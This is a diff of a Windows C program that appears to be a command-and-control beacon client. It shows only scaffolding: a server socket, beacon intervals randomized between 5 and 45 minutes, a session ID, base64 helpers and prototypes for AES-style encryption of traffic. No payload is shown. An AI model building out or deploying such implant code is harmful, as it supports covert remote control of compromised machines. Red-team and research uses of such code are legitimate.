@@ -3,6 +3,7 @@
 
 #include <stdio.h>
 #include <stdlib.h>
+#include <stdarg.h>
 #include <string.h>
 #include <tchar.h>
 #include <time.h>
@@ -24,6 +25,9 @@
 #define IV_LENGTH 12
 #define SALT_LENGTH 32
 #define TAG_LENGTH 16
+#define SESSION_ID_LENGTH 32
+#define SHA256_DIGEST_LENGTH 32
+#define IP_ADDRESS_LENGTH 16
 #define CHUNK_SIZE 1024
 
 // Globals
@@ -31,8 +35,8 @@ SOCKET client_socket = INVALID_SOCKET;
 time_t start_time;
 FILE* log_file = NULL;
 int exit_process = 0;
-char* SESSION_ID = NULL;
-const int LOGGING = 1;
+char SESSION_ID[SESSION_ID_LENGTH + 1];
+const boolean LOGGING = TRUE;
 const char* CVER = "0.2.0";
 const char* TYPE = "c";
 const char* SERVER_ADDRESS = "localhost";
@@ -46,14 +50,26 @@ const int RETRY_INTERVALS[] = {
     240000,  // 4 minutes
     360000   // 6 minutes
 };
-const int BEACON_MIN_INTERVAL = 300000; // 5 minutes
-const int BEACON_MAX_INTERVAL = 2700000; // 45 minutes
+static const int BEACON_MIN_INTERVAL = 300000; // 5 minutes
+static const int BEACON_MAX_INTERVAL = 2700000; // 45 minutes
+
+const char base64_chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+int base64_invs[] = { 62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57, 58,
+	59, 60, 61, -1, -1, -1, -1, -1, -1, -1, 0, 1, 2, 3, 4, 5,
+	6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20,
+	21, 22, 23, 24, 25, -1, -1, -1, -1, -1, -1, 26, 27, 28,
+	29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42,
+	43, 44, 45, 46, 47, 48, 49, 50, 51 };
+
 
 // Function prototypes
 void log_it(const char* format, ...);
-char* get_session_id(const char* ip_address);
+void get_session_id();
+size_t b64_encoded_size(size_t inlen);
+size_t b64_decoded_size(const char *in);
+int b64_isvalidchar(char c);
 char* base64_encode(const unsigned char *data, size_t length);
-unsigned char* base64_decode(const char *data, size_t *length);
+int base64_decode(const char *in, unsigned char *out, size_t outlen);
 void derive_key(const unsigned char *shared_key, unsigned char *salt, unsigned char *key);
 char* encrypt_data(const char *data, const char *shared_key);
 char* decrypt_data(const char *encrypted, const char *shared_key);
